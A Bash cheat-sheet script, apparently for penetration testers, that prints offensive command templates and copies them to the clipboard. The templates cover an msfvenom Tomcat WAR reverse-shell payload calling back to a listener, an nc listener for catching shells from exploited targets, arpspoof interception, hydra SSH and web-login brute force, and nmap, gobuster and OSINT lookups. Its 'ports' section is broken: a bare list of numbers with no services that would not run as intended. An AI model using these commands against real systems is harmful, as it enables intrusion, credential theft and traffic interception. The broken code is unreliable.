#!/bin/env bash
if [[ -z $1 ]]; then
    echo 'Specify your command to help with:'
    echo ' - domain-osint'
    echo ' - nmap'
    echo ' - hydra'
    echo ' - gobuster'
    echo ' - nc'
    echo ' - git'
    echo ' - google-dorking'
    echo ' - smbmap'
    echo ' - bash-scripting'
    echo ' - arpspoof'
    echo ' - net-protocols'
    echo ' - reverse-shells'
    echo ' - ports'
fi

if [[ $1 == reverse-shells ]]; then
    war='msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local_IP> LPORT=<listening port> -f war > shell.war'

    echo "tomcat war file reverse shell"
    echo "1) $war - war reverse shell"

    read -t 60 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $war | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == net-protocols ]]; then
    echo "1) mdns - basic info"
    mdns_info='Multicast DNS (mDNS) is a protocol aimed at helping with name resolution 
    in smaller networks. In doing so, it takes a different approach than the well-known 
    DNS. Instead of querying a name server, all participants in the network are directly 
    addressed.'

    read -t 60 -p 'state your choice: ' choice
    case $choice in
        1) echo $mdns_info;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == arpspoof ]]; then
    IPv4_on='echo 1 > /proc/sys/net/ipv4/ip_forward'
    arpspoof='arpspoof -i eth0 -t <gateway> -r <target>'

    echo "1) $IPv4_on - IPv4 must be enabled"
    echo "2) $arpspoof - basic example"

    read -t 60 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $IPv4_on | xclip -selection c;;
        2) echo -n $arpspoof | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == smbmap ]]; then
    smbmap='smbmap -H $target'

    echo "1) $smbmap - enumerate remote host for available smb attributes"

    read -t 60 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $smbmap | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == domain-osint ]]; then
    whois='whois <domain>'
    nslookup='nslookup <domain>'
    theHarvester='theHarvester -d <domain> -b <source>'
    dig='dig <domain>'
    host='host <hostname>'

    echo "1) $whois - contact info/server addresses/other"
    echo "2) $nslookup - resolve the hostname to an IP address"
    echo "3) $theHarvester - automated gathering of email addresses"
    echo "4) $dig - dns lookup utility"
    echo "5) $host - names enumeration"

    read -t 60 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $whois | xclip -selection c;;
        2) echo -n $nslookup | xclip -selection c;;
        3) echo -n $theHarvester | xclip -selection c;;
        4) echo -n $dig | xclip -selection c;;
        5) echo -n $host | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == nmap ]]; then
    nmap_fast='nmap -sn -T5 $eth0_gateway/24'
    max_info_target='nmap -sS -A -O -p- -oN $target.scan $target'

    echo "1) $nmap_fast - scan all network you're in with subnet mask of 24 bits"
    echo "2) $max_info_target - scan single target for max data/save to file"

    read -t 60 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $nmap_fast | xclip -selection c;;
        2) echo -n $max_info_target | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == hydra ]]; then
    ssh_bruteforce='hydra [-l|-L] <login/login_dict> [-p|-P] <pwd/pwd_dict> -s <port> <host> ssh -vV'
    http_basicauth='hydra [-l|-L] <login/login_dict> [-p|-P] <pwd/pwd_dict> -s <port> -f <host> http[s]-[post|get]-form /<login-page>'
    http_auth='hydra [-l|-L] <login/login_dict> [-p|-P] <pwd/pwd_dict> -s <port> -f <host> http[s]-[post|get]-form /<login-page>'

    echo "1) $ssh_bruteforce - ssh bruteforce"
    echo "2) $http_basicauth - basic auth"
    echo "3) $http_auth - auth"

    read -t 30 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $ssh_bruteforce | xclip -selection c;;
        2) echo -n $http_basicauth | xclip -selection c;;
        3) echo -n $http_auth | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == gobuster ]]; then
    a='gobuster dir -u <target> -w <wordlist> -t 150'
    echo "1) $a"
    
    read -t 30 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $a | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == nc ]]; then
    nc_intercept='nc -nlvp <port>'

    echo "1) $nc_intercept - catch reverse shell from exploited target"

    read -t 30 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $nc_intercept | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == git ]]; then
    git_rm_remote='git rm -r --cached <folder_name>'

    echo "Remove object from remote repo, not local"
    echo "1) $git_rm_remote"

    read -t 30 -p 'state your choice: ' choice
    case $choice in
        1) echo -n $git_rm_remote | xclip -selection c;;
        *) echo 'nothing was chosen';;
    esac
fi

if [[ $1 == google-dorking ]]; then
    echo "Google-dorking basic queries:"
    echo " - cache:[url] - Shows the version of the web page from the search engineâ€™s cache."
    echo " - related:[url] - Finds web pages that are similar to the specified web page."
    echo " - info:[url] - Presents some information that Google has about a web page, including similar pages, the cached version of the page, and sites linking to the page."
    echo " - site:[url] - Finds pages only within a particular domain and all its subdomains."
    echo " - intitle:[text] or allintitle:[text] - Finds pages that include a specific keyword as part of the indexed title tag. You must include a space between the colon and the query for the operator to work in Bing."
    echo " - allinurl:[text] - Finds pages that include a specific keyword as part of their indexed URLs."
    echo " - meta:[text] - Finds pages that contain the specific keyword in the meta tags."
    echo " - filetype:[file extension] - Searches for specific file types."
    echo " - intext:[text], allintext:[text], inbody:[text] - Searches text of page. For Bing and Yahoo the query is inbody:[text]. For DuckDuckGo the query is intext:[text]. For Google either intext:[text] or allintext:[text] can be used."
    echo " - inanchor:[text] - Search link anchor text"
    echo " - location:[iso code] or loc:[iso code], region:[region code] - Search for specific region. For Bing use location:[iso code] or loc:[iso code] and for DuckDuckGo use region:[iso code].An iso location code is a short code for a country for example, Egypt is eg and USA is us. https://en.wikipedia.org/wiki/ISO_3166-1"
    echo " - contains:[text] - Identifies sites that contain links to filetypes specified (i.e. contains:pdf)"
    echo " - altloc:[iso code] - Searches for location in addition to one specified by language of site (i.e. pt-us or en-us)"
    echo " - feed:[feed type, i.e. rss] - Find RSS feed related to search term"
    echo " - hasfeed:[url] - Finds webpages that contain both the term or terms for which you are querying and one or more RSS or Atom feeds."
    echo " - ip:[ip address] - Find sites hosted by a specific ip address"
    echo " - language:[language code] - Returns websites that match the search term in a specified language"
    echo " - book:[title] - Searches for book titles related to keywords"
    echo " - maps:[location] - Searches for maps related to keywords"
    echo " - linkfromdomain:[url] - Shows websites whose links are mentioned in the specified url (with errors)"
fi

if [[ $1 == bash-scripting ]]; then
    printf 'Error codes:\n'
    printf '%6s - catchall for general errors let "var1 = 1/0"\n' 1
    printf '%6s - misuse of shell builtins, according to Bash documentation\n' 2
    printf '%6s - command invoked cannot execute\n' 126
    printf '%6s - "command not found"\n' 127
    printf '%6s - invalid argument to exit\n' 128
    printf '%6s - fatal error signal "n"\n' 128+n
    printf '%6s - script terminated by Control-C\n' 130
    printf '%6s - exit status out of range\n' 255
fi

if [[ $1 == ports ]]; then
    printf 'Ports - services:\n'
1
5
7
9
11
13
17
18
19
20
21
22
23
25
37
39
42
43
49
50
53
63
67
68
69
70
71
72
73
73
79
80
88
95
101
102
105
107
109
110
111
113
115
117
119
123
137
138
139
143
161
162
163
164
174
177
178
179
191
194
199
201
202
204
206
209
210
213
220
245
347
363
369
370
372
389
427
434
435
443
444
445
464
468
487
488
496
500
535
538
546
547
554
563
565
587
610
611
612
631
636
674
694
749
750
765
767
873
992
993
994
995
fi
